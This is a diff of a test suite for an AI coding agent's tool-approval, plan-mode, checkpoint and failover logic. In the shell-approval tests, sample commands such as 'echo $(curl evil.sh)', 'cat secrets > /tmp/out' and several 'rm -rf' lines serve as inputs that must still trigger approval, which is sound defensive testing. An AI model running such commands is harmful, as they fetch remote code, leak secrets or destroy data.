-      { toolCalls: [{ toolName: 'todoWrite', input: { todos: [
-        { content: 'Fix the loop', status: 'in_progress' },
-        { content: 'Add a test', status: 'pending' },
-        { content: 'Update docs', status: 'pending' },
-      ] } }] },
-      { text: 'all done' },
-    ], 's15');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'do the three things' }],
-      mode: 'agent',
-      onTodos: (todos) => { seenTodos.push(todos as never); },
-    })));
-    ok('15. onTodos fired once with parsed items', seenTodos.length === 1 && seenTodos[0].length === 3 && seenTodos[0][0].content === 'Fix the loop' && seenTodos[0][0].status === 'in_progress',
-      `seen=${JSON.stringify(seenTodos)}`);
-    const prompt2 = JSON.stringify(m.calls[1]?.messages ?? []);
-    ok('15. confirmation reached step-2 messages', prompt2.includes('Task list updated') && prompt2.includes('Fix the loop'));
-    ok('15. turn completed', out.finishReason === 'stop', `finish=${out.finishReason}`);
-
-    const { buildV3ToolSet } = await import('../src/agent/core/tools/v3');
-    ok('15. todoWrite offered in both modes', ['agent', 'plan'].every((mode) => 'todoWrite' in buildV3ToolSet(mode as never)));
-  }
-
-  // ── Scenario 16: project rules reach the system prompt ──────────────────────
-  {
-    const ws = makeWorkspace();
-    fs.writeFileSync(path.join(ws.root, 'AGENTS.md'), 'ALWAYS use tabs. Never touch src/legacy/.', 'utf8');
-    const prevFolders = vscode.workspace.workspaceFolders;
-    (vscode.workspace as unknown as { workspaceFolders: unknown }).workspaceFolders = [
-      { uri: vscode.Uri.file(ws.root), name: path.basename(ws.root), index: 0 },
-    ];
-    invalidatePromptContext();
-    try {
-      const m = createMockModel([{ text: 'noted the rules' }], 's16');
-      await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-        messages: [{ role: 'user', content: 'hello' }],
-        mode: 'agent',
-      })));
-      const system = JSON.stringify({ s: m.calls[0].systemPrompt, m: m.calls[0].messages });
-      ok('16. AGENTS.md body reached the model', system.includes('ALWAYS use tabs'), system.slice(0, 200));
-      ok('16. rules wrapped in <project_rules>', system.includes('<project_rules>'));
-
-      // ── Scenario 17: environment context + prompt length pin ────────────────
-      let ctx = await gatherPromptContext();
-      const prompt = composeSystemPrompt('agent', ctx);
-      ok('17. <environment_context> present with date + workspace', prompt.includes('<environment_context>') && prompt.includes(new Date().toISOString().slice(0, 10)) && prompt.includes(path.basename(ws.root)),
-        prompt.slice(0, 400));
-      // Length pin through the REAL pipeline: a 9K rules file → loadProjectRules caps 8K →
-      // gatherPromptContext slices to MAX_RULES_INJECT → composed prompt stays bounded.
-      fs.writeFileSync(path.join(ws.root, 'AGENTS.md'), 'x'.repeat(9_000), 'utf8');
-      invalidatePromptContext();
-      ctx = await gatherPromptContext();
-      const fatPrompt = composeSystemPrompt('agent', ctx);
-      // Pin rebased on the cline branch: BASE grew past 9_100 chars before the branch (stale
-      // pin — fails on main too). The INVARIANT here is the truncation marker + bounded length.
-      ok('17. prompt length pinned < 9_300 with max-size rules', fatPrompt.length < 9_300 && fatPrompt.includes('[project rules truncated]'), `len=${fatPrompt.length} rules=${ctx.rules.length} marker=${ctx.rules.includes('[project rules truncated]')}`);
-    } finally {
-      (vscode.workspace as unknown as { workspaceFolders: unknown }).workspaceFolders = prevFolders;
-      invalidatePromptContext();
-    }
-  }
-
-  // ── Scenario 18: editFile result carries the post-edit diagnostics note ─────
-  {
-    const ws = makeWorkspace();
-    const diag = { severity: 0, range: { start: { line: 0, character: 0 }, end: { line: 0, character: 5 } }, message: 'new type error', code: 'T1' };
-    let calls = 0;
-    (globalThis as { __tiermuxTestDiagnostics?: unknown }).__tiermuxTestDiagnostics = () => {
-      calls++;
-      return calls >= 2 ? [diag] : []; // before-snapshot clean, after-write has a NEW error
-    };
-    const m = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { text: 'fixed the error' },
-    ], 's18');
-    try {
-      const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-        messages: [{ role: 'user', content: 'fix foo.txt' }],
-        mode: 'agent',
-        onPermissionAsk: async () => 'once',
-      })));
-      const step2 = JSON.stringify(m.calls[1]?.messages ?? []);
-      ok('18. diagnostics note rode in the edit result', step2.includes('New diagnostics after this edit') && step2.includes('new type error'), step2.slice(0, 300));
-      ok('18. edit itself still applied (success preserved)', ws.read('foo.txt') === 'goodbye world');
-      ok('18. turn completed', out.finishReason === 'stop');
-    } finally {
-      delete (globalThis as { __tiermuxTestDiagnostics?: unknown }).__tiermuxTestDiagnostics;
-    }
-  }
-
-  // ── Scenario 19: getDiagnostics tool ─────────────────────────────────────────
-  {
-    const ws = makeWorkspace();
-    const diag = { severity: 0, range: { start: { line: 0, character: 0 }, end: { line: 0, character: 5 } }, message: 'boom', code: 'E1' };
-    (globalThis as { __tiermuxTestDiagnostics?: unknown }).__tiermuxTestDiagnostics = [
-      [vscode.Uri.file(path.join(ws.root, 'foo.txt')), [diag]],
-    ];
-    const m = createMockModel([
-      { toolCalls: [{ toolName: 'getDiagnostics', input: { path: 'foo.txt' } }] },
-      { text: 'there is an error' },
-    ], 's19');
-    try {
-      const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-        messages: [{ role: 'user', content: 'any errors?' }],
-        mode: 'agent',
-      })));
-      const step2 = JSON.stringify(m.calls[1]?.messages ?? []);
-      ok('19. diagnostics returned in the formatted shape', step2.includes('ERROR') && step2.includes('boom'), step2.slice(0, 300));
-      ok('19. turn completed', out.finishReason === 'stop', `finish=${out.finishReason}`);
-    } finally {
-      delete (globalThis as { __tiermuxTestDiagnostics?: unknown }).__tiermuxTestDiagnostics;
-    }
-  }
-
-  // ── Scenario 19b: requireWriteConfirmation=false skips the prompt for FILE tools only ──
-  // Until 2026-09-05 the setting reached inline chat's EditGate and nothing else; the agent's
-  // own write tools ignored it while its description promised otherwise.
-  {
-    const base = { alwaysAllow: new Set<string>(), alwaysDeny: new Set<string>(), autoModeAllowlist: new Set<string>() };
-    let asked = 0;
-    const ask = async () => { asked++; return 'reject' as const; };
-    const off = { ...base, mode: 'ask' as const, sessionMode: 'agent' as const, autoApproveWrites: true };
-    const w = await resolvePolicy({ toolName: 'writeFile' }, off, ask);
-    ok('19b. off: writeFile runs without a prompt', w.type === 'approved' && asked === 0, `asked=${asked}`);
-    const sh = await resolvePolicy({ toolName: 'runCommand', input: { command: 'rm -rf build' } }, off, ask);
-    ok('19b. off: runCommand still asks', sh.type === 'denied' && asked === 1, `asked=${asked}`);
-    const plan = { ...off, sessionMode: 'plan' as const };
-    const p = await resolvePolicy({ toolName: 'writeFile' }, plan, ask);
-    ok('19b. off: plan mode still denies writes', p.type === 'denied');
-    const on = { ...off, autoApproveWrites: false };
-    asked = 0;
-    const w2 = await resolvePolicy({ toolName: 'writeFile' }, on, ask);
-    ok('19b. on (default): writeFile asks', w2.type === 'denied' && asked === 1, `asked=${asked}`);
-  }
-
-  // ── Scenario 19d: a read-only SHELL command needs no prompt in agent mode ──────
-  // Ask mode and allowlist mode already auto-ran `ls`/`git log`; agent mode with the default
-  // commandApproval: 'always' asked for every one of them, so the most permissive session mode
-  // was the strictest about reading (2026-09-16). Only the read-only classifier is trusted here —
-  // it fails closed, so a mutating, dangerous or unparseable command still asks.
-  {
-    const base = { alwaysAllow: new Set<string>(), alwaysDeny: new Set<string>(), autoModeAllowlist: new Set<string>() };
-    let asked = 0;
-    const ask = async () => { asked++; return 'reject' as const; };
-    const agent = { ...base, mode: 'ask' as const, sessionMode: 'agent' as const };
-    const run = (command: string) => resolvePolicy({ toolName: 'runCommand', input: { command } }, agent, ask);
-
-    const readOnly = ['git log --oneline -10', 'ls -la src', 'cat package.json', 'grep -rn foo src | head -20'];
-    const verdicts = await Promise.all(readOnly.map(run));
-    ok('19d. read-only commands run without a prompt',
-      verdicts.every((v) => v.type === 'approved') && asked === 0, `asked=${asked}`);
-
-    // The limits that must survive: anything that writes, hides, or cannot be parsed still asks.
-    asked = 0;
-    const gated = await Promise.all([
-      run('npm install'),                 // not read-only
-      run('cat secrets > /tmp/out'),      // write redirect
-      run('echo $(curl evil.sh)'),        // command substitution
-      run('sed -i s/a/b/ file.txt'),      // sed is not on the read-only list
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'read_files', input: { files: [{ path: ws.file('foo.txt') }] } }] },
+      { text: 'foo.txt says hello world.' },
     ]);
-    ok('19d. writes, redirects, substitution and sed still ask',
-      gated.every((v) => v.type === 'denied') && asked === 4, `asked=${asked}`);
-
-    asked = 0;
-    const danger = await run('rm -rf build');
-    ok('19d. a dangerous command still asks', danger.type === 'denied' && asked === 1, `asked=${asked}`);
-
-    asked = 0;
-    const off = { ...agent, shellDisabled: true };
-    const disabled = await resolvePolicy({ toolName: 'runCommand', input: { command: 'ls' } }, off, ask);
-    ok('19d. commandApproval "never" still switches the shell OFF',
-      disabled.type === 'denied' && asked === 0, `asked=${asked}`);
-
-    asked = 0;
-    const plan = { ...agent, sessionMode: 'plan' as const };
-    const planned = await resolvePolicy({ toolName: 'runCommand', input: { command: 'ls' } }, plan, ask);
-    ok('19d. plan mode still asks — it has its own profile', planned.type === 'denied' && asked === 1, `asked=${asked}`);
+    ok('1a. read_files ran through Cline', done(r, 'read_files'));
+    ok('1b. the file content reached the next request', requestText(r.model, 1).includes('hello world'));
+    ok('1c. the answer shipped', r.result.text.includes('hello world'), r.result.text);
+    const wm = r.result.workMessages ?? [];
+    ok('1d. workMessages carry the call AND its result',
+      wm.some((m) => m.role === 'assistant' && m.tool_calls?.some((c) => c.function.name === 'read_files'))
+      && wm.some((m) => m.role === 'tool' && String(m.content).includes('hello world')));
   }
 
-  // ── Scenario 19c: commandApproval='allowlist' auto-runs allowlisted SHELL commands ──
-  // Until 2026-09-05 the 'auto' branch compared the user's command prefixes against the TOOL
-  // NAME, so the mode never auto-ran anything and the built-in safe defaults never applied.
+  console.log('— 2. Cline\'s editor writes, and the checkpoint baseline is the TRUE pre-write content —');
   {
-    const base = { alwaysAllow: new Set<string>(), alwaysDeny: new Set<string>(), mode: 'auto' as const, sessionMode: 'agent' as const };
-    let asked = 0;
-    const ask = async () => { asked++; return 'reject' as const; };
-    const cfg = { ...base, autoModeAllowlist: new Set(['php artisan migrate']) };
-    const run = (command: string) => resolvePolicy({ toolName: 'runCommand', input: { command } }, cfg, ask);
-    ok('19c. built-in default (npm test) runs without a prompt', (await run('npm test')).type === 'approved' && asked === 0);
-    ok('19c. user prefix (php artisan migrate --seed) runs', (await run('php artisan migrate --seed')).type === 'approved' && asked === 0);
-    ok('19c. read-only (git status) runs', (await run('git status')).type === 'approved' && asked === 0);
-    ok('19c. unlisted (docker compose up) asks', (await run('docker compose up')).type === 'denied' && asked === 1);
-    ok('19c. dangerous (rm -rf dist) asks even though rm is not listed', (await run('rm -rf dist')).type === 'denied' && asked === 2);
-    const w = await resolvePolicy({ toolName: 'writeFile' }, cfg, ask);
-    ok('19c. file tools still ask in allowlist mode', w.type === 'denied' && asked === 3);
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('foo.txt'), old_text: 'hello world', new_text: 'hello cline' } }] },
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('new.txt'), new_text: 'fresh' } }] },
+      { text: 'Done.' },
+    ], { autoApprove: true });
+    ok('2a. the edit landed on disk', ws.read('foo.txt') === 'hello cline', ws.read('foo.txt'));
+    ok('2b. the create landed on disk', fs.existsSync(ws.file('new.txt')) && ws.read('new.txt') === 'fresh');
+    const baseline = r.writes.find((w) => w.path.endsWith('foo.txt'));
+    ok('2c. baseline = pre-write content', baseline?.before === 'hello world', JSON.stringify(baseline));
+    ok('2d. a new file\'s baseline is null', r.writes.find((w) => w.path.endsWith('new.txt'))?.before === null);
+    const changed = r.result.changedFiles ?? [];
+    ok('2e. changedFiles reports modified + created',
+      changed.some((c) => c.path.endsWith('foo.txt') && c.status === 'modified')
+      && changed.some((c) => c.path.endsWith('new.txt') && c.status === 'created'), JSON.stringify(changed));
   }
 
-  // ── Scenario 20: always-allow persists across turns (session grants) ────────
+  console.log('— 3. a tool FAILURE reaches the model and the run continues —');
   {
-    clearSessionGrants('s20');
-    // Unit half: the grant written via 'allow-always' survives a FRESH policyFromSettings.
-    const cfg1 = policyFromSettings(false, 'agent', 's20');
-    const d1 = await resolvePolicy({ toolName: 'editFile' }, cfg1, async () => 'allow-always');
-    const cfg2 = policyFromSettings(false, 'agent', 's20');
-    let asked = 0;
-    const d2 = await resolvePolicy({ toolName: 'editFile' }, cfg2, async () => { asked++; return 'reject'; });
-    ok('20. first ask resolves via approval channel', d1.type === 'approved');
-    ok('20. grant persists in a fresh policy (no re-ask)', d2.type === 'approved' && asked === 0, `asked=${asked}`);
-    clearSessionGrants('s20');
-
-    // Engine half: two turns sharing a sessionId — turn 2's edit is auto-approved.
-    const ws = makeWorkspace();
-    const m1 = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { text: 'done once' },
-    ], 's20a');
-    let askCount = 0;
-    const ask = async () => { askCount++; return 'always' as const; };
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m1, engineOpts({
-      messages: [{ role: 'user', content: 'change hello to goodbye' }],
-      mode: 'agent', sessionId: 's20-engine',
-      onPermissionAsk: ask,
-    })));
-    const m2 = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'goodbye', replace: 'farewell' } }] },
-      { text: 'done twice' },
-    ], 's20b');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m2, engineOpts({
-      messages: [{ role: 'user', content: 'change goodbye to farewell' }],
-      mode: 'agent', sessionId: 's20-engine',
-      onPermissionAsk: ask,
-    })));
-    ok('20. engine: turn 2 edit auto-approved (asked only in turn 1)', askCount === 1 && ws.read('foo.txt') === 'farewell world', `askCount=${askCount} content=${ws.read('foo.txt')}`);
-    clearSessionGrants('s20-engine');
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'read_files', input: { files: [{ path: ws.file('missing.txt') }] } }] },
+      { text: 'That file does not exist.' },
+    ]);
+    ok('3a. the run completed', !r.result.failed && r.result.text.includes('does not exist'), r.result.text);
+    ok('3b. the failure text reached the model', /missing\.txt/.test(requestText(r.model, 1)));
   }
 
-  // ── Scenario 21: reasoning streams INCREMENTALLY (not end-dumped) ───────────
+  console.log('— 4. abort mid-stream is a resumable pause, not a failure —');
   {
-    // (a) Splitter-level: a long think block fed in 8 chunks must emit reasoning on
-    // MULTIPLE feeds before flush — locks the incremental pass-through so nobody
-    // "optimizes" the ThinkStripper back into end-of-stream buffering.
-    const splitter = createStreamTextSplitter();
-    const thinkBody = 'alpha beta gamma delta epsilon zeta eta theta iota kappa';
-    const pieces: string[] = [];
-    const chunkSize = Math.ceil(('<think>' + thinkBody + '</think>ok').length / 8);
-    const whole = '<think>' + thinkBody + '</think>ok';
-    for (let i = 0; i < whole.length; i += chunkSize) pieces.push(whole.slice(i, i + chunkSize));
-    let emittingFeeds = 0;
-    let reasoning = '';
-    for (const p of pieces) {
-      const out = splitter.feed(p, '');
-      if (out.reasoning) emittingFeeds++;
-      reasoning += out.reasoning;
-    }
-    const f = splitter.flush();
-    if (f.reasoning) emittingFeeds++;
-    ok('21. splitter emits reasoning incrementally (>=2 feeds before flush)', emittingFeeds >= 2, `emittingFeeds=${emittingFeeds}`);
-    ok('21. splitter full think content captured', reasoning.includes(thinkBody), `reasoning=${JSON.stringify(reasoning)}`);
-
-    // (b) Engine-level: multi-delta reasoning fires onReasoning per delta.
-    const ws = makeWorkspace();
-    const reasoningCalls: string[] = [];
-    const m = createMockModel([
-      { reasoningDeltas: ['part one ', 'part two ', 'part three'], text: 'answer' },
-    ], 's21');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'think then answer' }],
-      mode: 'agent',
-      onReasoning: (t) => { reasoningCalls.push(t); },
-    })));
-    ok('21. engine: onReasoning fired per delta (>1)', reasoningCalls.length > 1, `calls=${reasoningCalls.length}`);
-    ok('21. engine: reasoning concatenation matches', (out.reasoning ?? '') === 'part one part two part three', `reasoning=${JSON.stringify(out.reasoning)}`);
+    const ws = workspace();
+    const ac = new AbortController();
+    setTimeout(() => ac.abort(), 150);
+    const r = await turn(ws.root, [{ hang: true, text: 'thinking…' }], { abortSignal: ac.signal });
+    ok('4a. paused', r.result.paused === true, JSON.stringify({ paused: r.result.paused, failed: r.result.failed }));
+    ok('4b. not failed and no error surfaced', !r.result.failed && r.errors.length === 0, r.errors.join(' | '));
   }
 
-  // ── Scenario 22: non-empty prose ships as-is, no narration guessing ──────────
-  // The old act-gap nudge fired on reply TEXT matching ("Let me grep…") and retracted the
-  // draft before a continuation pass. That prose classification is removed: a non-empty
-  // synthesis ships verbatim in one model call, with no retract. Empty replies still nudge
-  // (see the close-loop suite); this locks that prose is never second-guessed.
+  console.log('— 5. plan mode: Cline\'s read-only toolset, and the VS Code plan contract —');
   {
-    const ws = makeWorkspace();
-    const retracts: number[] = [];
-    const chunks: string[] = [];
-    const m = createMockModel([
-      { text: 'The user is asking me to search for hello. Let me grep for hello' },
-    ], 's22');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'Hello' }],
-      mode: 'agent',
-      onChunk: (t) => chunks.push(t),
-      onRetractDraft: () => retracts.push(1),
-    })));
-    ok('22. no nudge on non-empty prose (one model call)', m.calls.length === 1, `calls=${m.calls.length}`);
-    ok('22. no draft retracted', retracts.length === 0, `retracts=${retracts.length}`);
-    ok('22. result.text is the prose verbatim', out.text === 'The user is asking me to search for hello. Let me grep for hello', `text=${JSON.stringify(out.text)}`);
-    ok('22. the prose streamed once', chunks.length === 1, `chunks=${JSON.stringify(chunks)}`);
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('foo.txt'), old_text: 'hello world', new_text: 'nope' } }] },
+      { text: '1. Change foo.txt. Switch to Agent mode to apply it.' },
+    ], { mode: 'plan', autoApprove: true });
+    ok('5a. no editor in the offer', !offered(r.model).includes('editor'), offered(r.model).join(','));
+    ok('5b. a hallucinated edit changed nothing', ws.read('foo.txt') === 'hello world');
+    ok('5c. the prompt tells the model the USER flips to Act', String(r.model.calls[0]?.systemPrompt).includes('toggle to Act mode'));
+    ok('5d. the plan shipped as the answer', r.result.text.includes('Change foo.txt'), r.result.text);
+  }
+  {
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'run_commands', input: { commands: ['ls'] } }] },
+      { text: 'Listed.' },
+    ], { mode: 'plan', verdict: 'reject' });
+    ok('5e. a plan-mode shell command ASKS even when read-only', r.asks.some((a) => a.toolName === 'run_commands'), JSON.stringify(r.asks));
   }
 
-  // ── Scenario 23: provider stream error → honest failed result, not a phantom turn ──
-  // Live repro (1:18 AM, "@routes/web.php optimize this"): the provider chain died in ~1s,
-  // but consumeStream() RESOLVES on stream errors (it never rejects), so the engine returned
-  // finish 'unknown' / 0 in / 0 out as if the turn succeeded and the webview guessed "check
-  // your model keys". The engine must surface the real error via failed+errorMessage.
+  console.log('— 6. approvals and their settings —');
   {
-    const ws = makeWorkspace();
-    const m = createMockModel([
-      { error: new Error('TierMux: all candidates failed: 401 Unauthorized') },
-    ], 's23');
-    const out = await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'optimize this' }],
-      mode: 'agent',
-    })));
-    ok('23. stream error → failed:true (not a silent empty success)', out.failed === true, `failed=${out.failed} finish=${out.finishReason}`);
-    ok('23. errorMessage carries the real provider reason', !!out.errorMessage && out.errorMessage.includes('401 Unauthorized'), String(out.errorMessage));
-    ok('23. no phantom text', out.text === '', `text=${JSON.stringify(out.text)}`);
+    const ws = workspace();
+    settings({ commandApproval: 'always' });
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('foo.txt'), old_text: 'hello world', new_text: 'rejected' } }] },
+      { text: 'Understood, leaving it.' },
+    ], { verdict: 'reject' });
+    ok('6a. an edit asks', r.asks.some((a) => a.toolName === 'editor'));
+    ok('6b. a rejection blocks the write', ws.read('foo.txt') === 'hello world');
+    ok('6c. the deny reason reaches the model', /denied/i.test(requestText(r.model, 1)));
+    ok('6d. the run survives the rejection', r.result.text.includes('leaving it'), r.result.text);
+  }
+  {
+    const ws = workspace();
+    settings({ commandApproval: 'always', requireWriteConfirmation: false });
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('foo.txt'), old_text: 'hello world', new_text: 'unprompted' } }] },
+      { toolCalls: [{ toolName: 'run_commands', input: { commands: ['touch made-by-shell.txt'] } }] },
+      { text: 'Done.' },
+    ], { verdict: 'reject' });
+    ok('6e. requireWriteConfirmation=false: the edit runs without a prompt', ws.read('foo.txt') === 'unprompted' && !r.asks.some((a) => a.toolName === 'editor'));
+    ok('6f. …but a mutating shell command still asks', r.asks.some((a) => a.toolName === 'run_commands' && /touch/.test(a.command ?? '')), JSON.stringify(r.asks));
+  }
+  {
+    const ws = workspace();
+    settings({ commandApproval: 'always' });
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'run_commands', input: { commands: ['ls', 'git status'] } }] },
+      { text: 'Listed.' },
+    ], { verdict: 'reject' });
+    ok('6g. read-only shell commands auto-run in agent mode', r.asks.length === 0 && done(r, 'run_commands'), JSON.stringify(r.asks));
+  }
+  {
+    const ws = workspace();
+    settings({ commandApproval: 'always' });
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'run_commands', input: { commands: ['ls', 'rm -rf foo.txt'] } }] },
+      { text: 'Stopped.' },
+    ], { verdict: 'reject' });
+    ok('6h. one dangerous entry in a batch forces the prompt', r.asks.length === 1 && fs.existsSync(ws.file('foo.txt')), JSON.stringify(r.asks));
+  }
+  {
+    const ws = workspace();
+    settings({ commandApproval: 'never' });
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'run_commands', input: { commands: ['touch should-not-exist.txt'] } }] },
+      { text: 'The shell is disabled.' },
+    ], { autoApprove: true });
+    ok('6i. commandApproval=never disables the shell, even with auto-approve', !fs.existsSync(ws.file('should-not-exist.txt')));
+    ok('6j. …and says why', /disabled/.test(requestText(r.model, 1)));
+  }
+  {
+    const ws = workspace();
+    settings({ commandApproval: 'always' });
+    clearSessionGrants('grant-session');
+    const first = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('foo.txt'), old_text: 'hello world', new_text: 'one' } }] },
+      { text: 'ok' },
+    ], { verdict: 'always', sessionId: 'grant-session' });
+    const second = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'editor', input: { path: ws.file('foo.txt'), old_text: 'one', new_text: 'two' } }] },
+      { text: 'ok' },
+    ], { verdict: 'reject', sessionId: 'grant-session' });
+    ok('6k. "Always" persists across turns in a session', first.asks.length === 1 && second.asks.length === 0 && ws.read('foo.txt') === 'two', `${first.asks.length}/${second.asks.length} ${ws.read('foo.txt')}`);
+  }
+  settings({});
+
+  console.log('— 7. ask_question drives the ask card and the answer reaches the model —');
+  {
+    const ws = workspace();
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'ask_question', input: { question: 'Which language?', options: ['Use TypeScript', 'Use Python'] } }] },
+      { text: 'Going with TypeScript.' },
+    ]);
+    ok('7a. the card got the question and options', r.questions[0]?.question === 'Which language?' && r.questions[0]?.options?.length === 2, JSON.stringify(r.questions));
+    ok('7b. the answer reached the model', requestText(r.model, 1).includes('Use TypeScript'));
   }
 
-  // ── Scenario 24: quota/credit failures ARE failover-worthy ─────────────────
-  // Live repro: "auto rotate not works" — free gateways answer out-of-credit with 402
-  // (pollinations) and paid-only-model-with-$0-credit with 403 (new-api/TokenRouter), and
-  // isFailoverWorthy only rotated on 401/429/5xx/network — so those errors threw straight
-  // through the candidate loop and killed the turn with zero rotation.
+  console.log('— 8. Cline\'s rules reach the system prompt —');
   {
-    const { isFailoverWorthy } = await import('../src/agent/core/routerProvider');
-    const { ProviderHttpError } = await import('../src/providers/base');
-    const http = (status: number) => new ProviderHttpError(`API error ${status}`, status);
-    for (const status of [400, 401, 402, 403, 429, 500, 503]) {
-      ok(`24. HTTP ${status} rotates to the next model`, isFailoverWorthy(http(status)));
-    }
-    ok('24. 200-class success never rotates', !isFailoverWorthy(new Error('some parse glitch')));
-    ok('24. network errors rotate', isFailoverWorthy(new Error('fetch failed')));
+    const ws = workspace();
+    fs.mkdirSync(ws.file('.clinerules'));
+    fs.writeFileSync(ws.file('.clinerules/style.md'), '---\nname: style\n---\nAlways answer in lowercase.\n');
+    fs.writeFileSync(ws.file('AGENTS.md'), '# Agent rules\n\nNever touch the vendor folder.\n');
+    const r = await turn(ws.root, [{ text: 'ok' }]);
+    const sys = String(r.model.calls[0]?.systemPrompt ?? '');
+    ok('8a. .clinerules/ reached the prompt', sys.includes('Always answer in lowercase.'));
+    ok('8b. AGENTS.md reached the prompt', sys.includes('Never touch the vendor folder.'));
+    ok('8c. the prompt is Cline\'s', sys.includes('You are Cline'));
   }
 
-  // ── Scenario 25: checkpoint baseline is the TRUE pre-write content (2026-08-28, "undo not
-  // restoreing files"): the only baseline capture ran from onStepEnd, AFTER the tool had written,
-  // so restore rewrote files with the content it was meant to undo. Tools now capture the
-  // baseline themselves (onBeforeWrite).
+  console.log('— 9. MCP tools reach the model in agent mode only —');
   {
-    const ws = makeWorkspace(); // foo.txt = 'hello world', bar.txt = 'second file'
-    const { CheckpointManager } = await import('../src/edits/checkpoints');
-    const cps = new CheckpointManager(ws.root); // non-git tmp dir → snaps path (the broken one)
-    await cps.begin('r1', 'undo restores'); // the host does this in handleSend before the turn
-    const m = createMockModel([
-      { toolCalls: [{ toolName: 'editFile', input: { path: 'foo.txt', search: 'hello', replace: 'goodbye' } }] },
-      { toolCalls: [{ toolName: 'writeFile', input: { path: 'new.txt', content: 'brand new' } }] },
-      { text: 'edited foo, created new' },
-    ], 's25');
-    await runWithWorkspaceRoot(ws.root, () => engineTurn(m, engineOpts({
-      messages: [{ role: 'user', content: 'edit foo.txt and create new.txt' }],
-      mode: 'agent',
-      onBeforeWrite: (uri, before) => cps.record(uri, before),
-      onPermissionAsk: async () => 'once',
-    })));
-    ok('25. edits landed on disk', ws.read('foo.txt') === 'goodbye world' && ws.read('new.txt') === 'brand new',
-      `foo=${ws.read('foo.txt')} new=${ws.read('new.txt')}`);
-    await cps.commit();
-    ok('25. checkpoint kept (baselines recorded)', cps.list().length === 1, `list=${JSON.stringify(cps.list())}`);
-    const changed = await cps.changedFiles(cps.list()[0].id);
-    ok('25. changedFiles sees both files (true pre-state differs from disk)',
-      changed.length === 2 && changed.every((f) => f.status === 'modified' || f.status === 'created'),
-      JSON.stringify(changed));
-    const n = await cps.restore(cps.list()[0].id);
-    ok('25. restore reverts the edit AND un-creates the new file',
-      n === 2 && ws.read('foo.txt') === 'hello world' && !fs.existsSync(path.join(ws.root, 'new.txt')),
-      `n=${n} foo=${JSON.stringify(ws.read('foo.txt'))} newExists=${fs.existsSync(path.join(ws.root, 'new.txt'))}`);
+    const ws = workspace();
+    let called = '';
+    const fake = {
+      agentTools: async () => [{
+        name: 'mcp__demo__echo',
+        description: 'Echo the input.',
+        inputSchema: { type: 'object', properties: { text: { type: 'string' } } },
+        execute: async (input: { text?: string }) => { called = input.text ?? ''; return `echo: ${input.text}`; },
+      }],
+    } as unknown as McpManager;
+    setMcpManager(fake);
+    const r = await turn(ws.root, [
+      { toolCalls: [{ toolName: 'mcp__demo__echo', input: { text: 'ping' } }] },
+      { text: 'Echoed.' },
+    ], { autoApprove: true });
+    ok('9a. offered in agent mode', offered(r.model).includes('mcp__demo__echo'));
+    ok('9b. executed with the model\'s input', called === 'ping', called);
+    const p = await turn(ws.root, [{ text: 'ok' }], { mode: 'plan' });
+    ok('9c. withheld in plan mode', !offered(p.model).includes('mcp__demo__echo'));
+    setMcpManager(undefined as unknown as McpManager);
   }
 
-  // ── Pinned model runs ALONE (2026-08-31, user direction) ────────────────────
-  // A SET model is an exact request: the selection is the pin and NOTHING else. The old
-  // chain padded the pin with the task table and every usable enabled model, so a failing
-  // pin was silently answered by a different provider's model while the footer still
-  // credited the pin (live repro: openrouter GLM pinned, kilo Nemotron served). A dead pin
-  // now fails the turn with the real error instead.
+  console.log('— 10. the step cap is a resumable pause —');
   {
-    const { setModelSources, selectModel } = await import('../src/router/picker');
-    const store = new Map<string, string[]>();
-    setModelSources({
-      // kimi-k2 is deliberately marked tool-incapable — the requireTools assertion below
-      // proves the picker skips it.
-      catalog: { find: (_p: string, m: string) => ({ supportsTools: m !== 'kimi-k2' }) } as never,
-      settings: {
-        getFallback: () => [
-          { platform: 'groq', modelId: 'openai/gpt-oss-120b', enabled: true, priority: 0 },
-          { platform: 'kilo', modelId: 'kimi-k2', enabled: true, priority: 1 },
-          { platform: 'opencode', modelId: 'glm-4.6-flash-free', enabled: true, priority: 2 },
-        ],
-        getDisabledProviders: () => [],
-        // Mirrors the real SettingsStore: per-model `enabled` AND the provider-level switch.
-        enabledByPriority(): Array<{ platform: string; modelId: string; enabled: boolean; priority: number }> {
-          const off = new Set(this.getDisabledProviders());
-          return this.getFallback().filter((e) => e.enabled && !off.has(e.platform)).sort((a, b) => a.priority - b.priority);
-        },
-      } as never,
